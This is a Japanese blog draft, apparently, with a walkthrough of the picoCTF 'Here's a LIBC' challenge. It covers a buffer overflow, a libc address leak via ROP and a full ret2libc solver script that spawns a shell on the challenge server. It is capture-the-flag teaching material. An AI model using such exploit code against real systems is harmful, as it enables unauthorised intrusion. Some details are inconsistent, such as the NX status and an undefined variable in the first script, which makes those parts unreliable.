---
title: picoCTFのPwn問をぼちぼち解いていくメモ 
date: "2022-03-15"
template: "post"
draft: true
slug: ""
category: ""
tags:
  - ""
  - ""
  - ""
description: ""
socialImage: "/media/cards/no-image.png"


---

<!-- omit in toc -->

## もくじ



## Here's a LIBC

親切にもバイナリとライブラリを提供してくれたと思ったらまた実行できないパターンでした。

``` bash
LD_PRELOAD=./libc.so.6 ./vuln 
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

というわけでpwninit使ってリンカを取得し、無事に実行ができるようになりました。

実行してみると、エコーサーバーのようになっているようです。

適当に入力値を増やしてみたところセグフォが発生したので、BOFの脆弱性がありそうです。

![image-20220715194106287](../static/media/2022-03-15-ctf-pico-pwn-archived/image-20220715194106287.png)

Ghidraでデコンパイルしてみると、`main`関数から呼び出される以下の`do_stuff`関数がエコーサーバの処理になっていることがわかりました。

つまりここにBOFの脆弱性が存在しています。

![image-20220715194314741](../static/media/2022-03-15-ctf-pico-pwn-archived/image-20220715194314741.png)

pedaのコマンドで確認してみると、PIEは無効化されていることがわかります。

``` bash
$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

また、エコーサーバへの入力値が格納されるスタックのアドレスは`0x7fffffffdd40`であり、rbpは`0x7fffffffddc0`でした。

つまり、差分の128+8バイトの文字列を入力として与えれば、以降の入力値で関数の戻り値をインジェクションできそうです。

今回はNXが無効なようなので、ひとまずpedaでpltを探索してみました。

``` bash
$ plt
Breakpoint 2 at 0x400580 (__isoc99_scanf@plt)
Breakpoint 3 at 0x400570 (getegid@plt)
Breakpoint 4 at 0x400540 (puts@plt)
Breakpoint 5 at 0x400560 (setbuf@plt)
Breakpoint 6 at 0x400550 (setresgid@plt)
```

systemのpltは無いようなので、ret2libcを使ってlibcのアドレスをリークさせて直接ジャンプしたいと思います。

ここで、ROPgadgetを使ってみると、以下のガジェットが使えそうなことがわかりました。

``` bash
$ ROPgadget --binary vuln
0x0000000000400913 : pop rdi ; ret
```

これを利用して、とりあえず以下のような入力値を用意することでscanf関数のgotをリークさせることができます。

``` bash
$ python -c 'import sys; sys.stdout.buffer.write(b"A"*128 + b"B"*8 + b"\x13\x09\x40\x00\x00\x00\x00\x00" + b"\x38\x10\x60\x00\x00\x00\x00\x00" + b"\x69\x07\x40\x00\x00\x00\x00\x00" )' > input
```

このままでは使いづらいので、pwntoolを使って書き直してみました。

``` python
from pwn import *
import binascii
import time

elf = ELF("./vuln")
context.binary = elf

puts_plt = 0x400540
got_plt_scanf = 0x601038
rop_rdi_ret = 0x400913

# Local
p = process("./vuln")

# Remote
# p = remote("bof.pwn.wanictf.org", 9002)

payload = b""
payload += b"\x41"*128
payload += b"\x42"*8
payload += p64(rop_rdi_ret)
payload += p64(got_plt_puts)
payload += p64(puts_plt)

r = p.recvline()
p.sendline(payload)
r = p.recvline()

leakaddr = u64(p.recvline().rstrip().ljust(8, b"\x00"))
print(hex(leakaddr))
```

これでリークしたアドレスを利用してlibcのオフセットを特定しました。

![image-20220719191646337](../static/media/2022-03-15-ctf-pico-pwn-archived/image-20220719191646337.png)

最終的なSolverはこちら。

``` python
from pwn import *
import binascii
import time

elf = ELF("./vuln")
context.binary = elf

puts_plt = 0x400540
got_plt_scanf = 0x601038
rop_rdi_ret = 0x400913
ret = 0x40052e
main = 0x400771

# Local
p = process("./vuln")

# Remote
p = remote("mercury.picoctf.net", 42072)

payload = b""
payload += b"\x41"*128
payload += b"\x42"*8
payload += p64(rop_rdi_ret)
payload += p64(got_plt_scanf)
payload += p64(puts_plt)
payload += p64(main)

r = p.recvline()
p.sendline(payload)
r = p.recvline()

leakaddr = u64(p.recvline().rstrip().ljust(8, b"\x00"))
# print(hex(leakaddr))

base_addr = leakaddr - 0x07bf30
system_addr = base_addr + 0x04f4e0
str_bin_sh = base_addr +  0x1b40fa

payload = b""
payload += b"\x41"*128
payload += b"\x42"*8
payload += p64(ret)
payload += p64(rop_rdi_ret)
payload += p64(str_bin_sh)
payload += p64(system_addr)

r = p.recvline()
p.sendline(payload)
p.interactive()
```























